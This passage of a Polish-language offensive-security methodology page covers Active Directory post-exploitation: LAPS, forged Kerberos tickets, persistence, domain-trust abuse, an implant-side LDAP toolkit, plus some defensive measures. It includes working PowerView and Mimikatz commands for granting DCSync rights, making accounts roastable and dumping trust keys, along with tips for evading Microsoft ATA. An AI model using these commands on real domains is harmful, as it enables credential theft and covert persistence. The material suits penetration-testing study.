**LAPS** dostarcza system zarządzania **local Administrator password** na komputerach dołączonych do domeny, zapewniając, że jest ono **randomized**, unikalne i często **changed**. Te hasła są przechowywane w Active Directory, a dostęp jest kontrolowany przez ACLs tylko dla autoryzowanych użytkowników. Mając wystarczające uprawnienia do odczytu tych haseł, możliwe jest pivotowanie do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

**Gathering certificates** ze skompromitowanego komputera może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużycie szablonów certyfikatów

Jeśli skonfigurowane są **vulnerable templates**, możliwe jest ich nadużycie do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-eksploatacja z kontem o wysokich uprawnieniach

### Zrzucanie poświadczeń domeny

Gdy zdobędziesz uprawnienia **Domain Admin** lub jeszcze lepiej **Enterprise Admin**, możesz **dump** **bazę domeny**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc jako persistence

Niektóre z wcześniej omówionych technik mogą być użyte do utrzymania dostępu (persistence).\
Na przykład możesz:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** tworzy **legitny Ticket Granting Service (TGS) ticket** dla konkretnej usługi, używając **NTLM hash** (na przykład **hash of the PC account**). Ta metoda jest wykorzystywana do **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **NTLM hash of the krbtgt account** w środowisku Active Directory (AD). To konto jest specjalne, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Gdy atakujący zdobędzie ten hash, może tworzyć **TGTs** dla dowolnego konta, które wybierze (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są to jak golden tickets, sfałszowane w sposób, który **omija powszechne mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** to bardzo dobry sposób, by utrzymać dostęp do konta użytkownika (nawet jeśli zmieni hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates** umożliwia także utrzymanie dostępu z wysokimi uprawnieniami wewnątrz domeny:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins) poprzez zastosowanie standardowej **Access Control List (ACL)** do tych grup, aby zapobiec nieautoryzowanym zmianom. Jednak ta funkcja może być wykorzystana; jeśli atakujący zmodyfikuje ACL AdminSDHolder, nadając pełny dostęp zwykłemu użytkownikowi, użytkownik ten uzyskuje rozległą kontrolę nad wszystkimi grupami uprzywilejowanymi. Ten mechanizm bezpieczeństwa, mający na celu ochronę, może więc działać odwrotnie, umożliwiając nieuprawniony dostęp, jeśli nie jest ściśle monitorowany.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto **local administrator**. Uzyskując uprawnienia administratora na takiej maszynie, można wyekstrahować hash lokalnego Administratora za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **umożliwić użycie tego hasła**, co pozwala na zdalny dostęp do konta lokalnego Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **nadać** pewne **specjalne uprawnienia** użytkownikowi do konkretnych obiektów domeny, które pozwolą temu użytkownikowi **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory bezpieczeństwa

**Security descriptors** służą do **przechowywania** **uprawnień**, jakie **obiekt** posiada **nad** innym **obiektem**. Jeśli możesz dokonać nawet **niewielkiej zmiany** w **security descriptor** obiektu, możesz uzyskać bardzo interesujące uprawnienia nad tym obiektem bez konieczności bycia członkiem uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **universal password**, co da dostęp do wszystkich kont domenowych.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz stworzyć własny SSP, aby **przechwycić** **credentials** w **clear text** używane do dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **push attributes** (SIDHistory, SPNs...) na wskazanych obiektach **bez** zostawiania jakichkolwiek **logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz być wewnątrz **root domain**.\
Uwaga: jeśli użyjesz błędnych danych, pojawią się dość brzydkie logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omówiliśmy, jak eskalować uprawnienia jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Jednak te hasła można także wykorzystać do **maintain persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Eskalacja uprawnień na poziomie lasu - Zaufania domenowe

### Podstawowe informacje

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Tworzy on powiązanie między systemami uwierzytelniania obu domen, pozwalając na płynny przepływ weryfikacji uwierzytelniania. Gdy domeny ustanawiają zaufanie, wymieniają i przechowują określone **keys** w swoich **Domain Controllers (DCs)**, które są kluczowe dla integralności zaufania.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **trusted domain**, najpierw musi poprosić o specjalny bilet znany jako **inter-realm TGT** od kontrolera domeny swojej domeny. Ten TGT jest zaszyfrowany przy użyciu współdzielonego **key**, który obie domeny uzgodniły. Użytkownik następnie przedstawia ten TGT **DC of the trusted domain**, aby uzyskać bilet serwisowy (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez DC domeny zaufanej, wydaje on TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. Komputer-klient (**client computer**) w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash** do zażądania **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wydaje nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Klient następnie żąda **inter-realm TGT** od DC1, który jest potrzebny do dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany przy użyciu **trust key** współdzielonego między DC1 i DC2 jako części dwukierunkowego zaufania domenowego.
5. Klient przedstawia inter-realm TGT **Domain Controllerowi (DC2)** z Domain 2.
6. DC2 weryfikuje inter-realm TGT używając współdzielonego trust key i, jeśli jest ważny, wydaje **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi, który jest zaszyfrowany hashem konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Różne rodzaje zaufania

Ważne jest, aby zauważyć, że **zaufanie może być jednokierunkowe lub dwukierunkowe**. W opcji dwukierunkowej obie domeny ufają sobie nawzajem, ale w relacji **jednokierunkowej** jedna z domen będzie domeną ufającą (trusting), a druga domeną zaufaną (trusted). W tym ostatnim przypadku **będziesz mógł uzyskać dostęp jedynie do zasobów w domenie trusting, zaczynając z domeny trusted**.

Jeśli Domain A ufa Domain B, A jest domeną trusting, a B jest domeną trusted. Co więcej, w **Domain A** będzie to **Outbound trust**; a w **Domain B** będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: Jest to powszechna konfiguracja w ramach tego samego forest, gdzie child domain automatycznie ma dwukierunkowe tranzytywne zaufanie z domeną nadrzędną. W praktyce oznacza to, że żądania uwierzytelniania mogą swobodnie przepływać między rodzicem a dzieckiem.
- **Cross-link Trusts**: Nazywane też "shortcut trusts", są ustanawiane między domenami potomnymi, aby przyspieszyć proces referencji. W złożonych lasach żądania uwierzytelniania zwykle muszą przebyć drogę do root lasu, a następnie w dół do docelowej domeny. Tworząc cross-links skracasz tę drogę, co jest szczególnie przydatne w środowiskach geograficznie rozproszonych.
- **External Trusts**: Są ustanawiane między różnymi, niespowinowaconymi domenami i są z natury non-transitive. Według [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts są użyteczne do dostępu do zasobów w domenie poza aktualnym lasem, która nie jest połączona forest trust. Bezpieczeństwo wzmacniane jest przez SID filtering przy external trusts.
- **Tree-root Trusts**: Te zaufania są automatycznie ustanawiane między root domain lasu a właśnie dodanym tree root. Choć nie są często spotykane, tree-root trusts są ważne przy dodawaniu nowych drzew domen do lasu, umożliwiając im zachowanie unikalnej nazwy domeny i zapewniając dwukierunkową transitivity. Więcej informacji w [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ zaufania to dwukierunkowe transitive trust między dwoma forest root domains, również wymuszający SID filtering w celu zwiększenia środków bezpieczeństwa.
- **MIT Trusts**: Te zaufania są ustanawiane z nie-Windowsowymi, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) domenami Kerberos. MIT trusts są bardziej wyspecjalizowane i służą środowiskom wymagającym integracji z systemami Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach zaufania**

- Relacja zaufania może być również **transitive** (A ufa B, B ufa C, więc A ufa C) lub **non-transitive**.
- Relacja zaufania może być skonfigurowana jako **bidirectional trust** (obie ufają sobie nawzajem) lub jako **one-way trust** (tylko jedna ufa drugiej).

### Ścieżka ataku

1. **Wyenumeruj** relacje zaufania
2. Sprawdź, czy którykolwiek **security principal** (user/group/computer) ma **access** do zasobów **drugiej domeny**, np. przez wpisy ACE lub przez członkostwo w grupach drugiej domeny. Szukaj **relationships across domains** (zaufanie prawdopodobnie zostało utworzone właśnie w tym celu).
1. kerberoast w tym przypadku może być kolejną opcją.
3. **Skompromituj** konta, które mogą **pivot** przez domeny.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie poprzez trzy główne mechanizmy:

- **Local Group Membership**: Security principals mogą być dodani do lokalnych grup na maszynach, takich jak grupa “Administrators” na serwerze, co daje im znaczną kontrolę nad tą maszyną.
- **Foreign Domain Group Membership**: Principals mogą również być członkami grup w domenie obcej. Skuteczność tej metody zależy jednak od charakteru zaufania i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być wymienieni w **ACL**, szczególnie jako podmioty w **ACEs** w ramach **DACL**, zapewniając im dostęp do konkretnych zasobów. Dla zainteresowanych dogłębnym poznaniem mechaniki ACL, DACL i ACE polecamy whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.

### Znajdź zewnętrznych użytkowników/grupy z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/lasu**.

Możesz to sprawdzić w **Bloodhound** lub używając powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby na enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**, jeden dla _Child --> Parent_ i drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić, którego klucza używa bieżąca domena, używając:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Podnieś uprawnienia do Enterprise admin w domenie podrzędnej/nadrzędnej, nadużywając zaufania poprzez SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, jak można wykorzystać Configuration Naming Context (NC), jest kluczowe. Configuration NC pełni rolę centralnego repozytorium dla danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Te dane są replikowane do każdego Domain Controller (DC) w lesie, a zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **uprawnienia SYSTEM na DC**, najlepiej na child DC.

**Link GPO to root DC site**

Kontener Sites w Configuration NC zawiera informacje o site'ach wszystkich komputerów dołączonych do domeny w obrębie lasu AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą powiązać GPO z root DC sites. Ta akcja może potencjalnie skompromitować root domain poprzez manipulowanie politykami stosowanymi do tych site'ów.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jeden wektor ataku polega na celowaniu w uprzywilejowane gMSA w domenie. KDS Root key, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do KDS Root key i obliczyć hasła dowolnego gMSA w całym lesie.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ta metoda wymaga cierpliwości — oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować AD Schema, aby nadać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. To może prowadzić do nieautoryzowanego dostępu i kontroli nad nowo utworzonymi obiektami AD.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Luka ADCS ESC5 celuje w kontrolę nad obiektami Public Key Infrastructure (PKI), aby utworzyć szablon certyfikatu umożliwiający uwierzytelnianie się jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja zapisywalnego child DC umożliwia przeprowadzenie ataków ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Zewnętrzna domena lasu — One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **twoja domena jest zaufana** przez domenę zewnętrzną, która przyznaje ci **nieokreślone uprawnienia** wobec niej. Będziesz musiał ustalić, **które podmioty (principals) w twojej domenie mają jaki dostęp do domeny zewnętrznej**, a następnie spróbować to wykorzystać:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu - jednokierunkowa (wychodząca)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **your domain** ufa pewnym **privileges** podmiotowi z **different domains**.

Jednak gdy **domain is trusted** przez domenę ufającą, domena zaufana **creates a user** o **predictable name**, który używa jako **password the trusted password**. Oznacza to, że możliwe jest **access a user from the trusting domain to get inside the trusted one** w celu enumeracji i próby eskalacji dalszych uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem kompromitacji domeny zaufanej jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** względem trustu domeny (co nie jest zbyt częste).

Kolejną opcją jest poczekanie na maszynie, do której **user from the trusted domain can access** i zalogowanie się tam przez **RDP**. Wtedy atakujący może wstrzyknąć kod do procesu sesji RDP i **access the origin domain of the victim** stamtąd.\
Co więcej, jeśli **victim mounted his hard drive**, z procesu **RDP session** atakujący mógłby umieścić **backdoors** w **startup folder of the hard drive**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w trusts między lasami (forest trusts) jest łagodzone przez SID Filtering, które jest aktywowane domyślnie na wszystkich inter-forest trusts. Opiera się to na założeniu, że zaufania wewnątrz lasu są bezpieczne, traktując las (forest), a nie domenę, jako granicę bezpieczeństwa zgodnie ze stanowiskiem Microsoft.
- Istnieje jednak pewien problem: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączania.

### **Selective Authentication:**

- Dla inter-forest trusts zastosowanie Selective Authentication sprawia, że użytkownicy z dwóch lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskać dostęp do domen i serwerów w domenie lub lesie ufającym.
- Ważne jest, aby zauważyć, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto trustu.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` rozwiązują short names/OU paths na pełne DNs i zrzucają odpowiadające obiekty.
- `get-object`, `get-attribute`, i `get-domaininfo` pobierają dowolne atrybuty (w tym security descriptors) oraz metadane forest/domain z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, i `get-rbcd` ujawniają roasting candidates, ustawienia delegacji oraz istniejące [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) deskryptory bezpośrednio z LDAP.
- `get-acl` i `get-writable --detailed` parsują DACL, aby wymienić trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) oraz inheritance, dostarczając bezpośrednich celów do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi umieścić nowe principal-e lub konta maszyn tam, gdzie istnieją prawa do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` bezpośrednio przechwytują cele po znalezieniu praw write-property.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync` przekładają WriteDACL/WriteOwner na dowolnym obiekcie AD na reset haseł, kontrolę członkostwa w grupach lub przywileje DCSync bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast czynią skompromitowanego użytkownika Kerberoastable; `add-asreproastable` (przełącznik UAC) oznacza go do AS-REP roasting bez zmiany hasła.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beacona, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę zdalnego PowerShell lub RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` wstrzykuje uprzywilejowane SIDy do sidHistory kontrolowanego principal-a (patrz [SID-History Injection](sid-history-injection.md)), zapewniając ukrytą dziedziczność dostępu całkowicie przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, gdzie istnieją już delegowane prawa, przed nadużyciem `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle ograniczone polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itp.) pozwalają na szybki rollback po zebraniu poświadczeń lub ustanowieniu persistence, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Ogólne środki obronne

[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](../stealing-credentials/credentials-protections.md)

### **Środki obronne dotyczące ochrony poświadczeń**

- **Ograniczenia Domain Admins**: Zaleca się, aby Domain Admins logowali się tylko do Domain Controllers i unikali używania ich na innych hostach.
- **Uprawnienia kont usługowych**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA).
- **Czasowe ograniczenie uprawnień**: Dla zadań wymagających uprawnień DA ich okres powinien być ograniczony. Można to osiągnąć przez: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Łagodzenie LDAP relay**: Audytuj Event IDs 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DCs/clients, aby zablokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Wdrażanie technik deception**

- Wdrażanie deception polega na zakładaniu pułapek, takich jak użytkownicy lub komputery wabiki, z cechami takimi jak hasła, które nigdy nie wygasają, lub oznaczone jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z konkretnymi prawami lub dodawanie ich do grup o wysokich uprawnieniach.
- Praktyczny przykład używa narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej o wdrażaniu technik deception można znaleźć na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identyfikacja Deception**

- **Dla obiektów użytkowników**: Podejrzane wskaźniki obejmują nietypowe ObjectSID, rzadkie logowania, daty utworzenia oraz niskie liczby nieudanych prób logowania.
- **Wskaźniki ogólne**: Porównywanie atrybutów potencjalnych obiektów wabikowych z prawdziwymi może ujawnić niezgodności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pomagają w identyfikacji takich deceptions.

### **Ominięcie systemów wykrywania**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers, aby zapobiec wykryciu przez ATA.
- **Ticket Impersonation**: Wykorzystanie kluczy **aes** do tworzenia ticketów pomaga unikać detekcji poprzez niedopuszczanie do obniżenia do NTLM.
- **DCSync Attacks**: Zaleca się wykonywanie z nie-Domain Controller, aby uniknąć wykrycia przez ATA, ponieważ bezpośrednie wykonanie z Domain Controller spowoduje alerty.

## Źródła

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
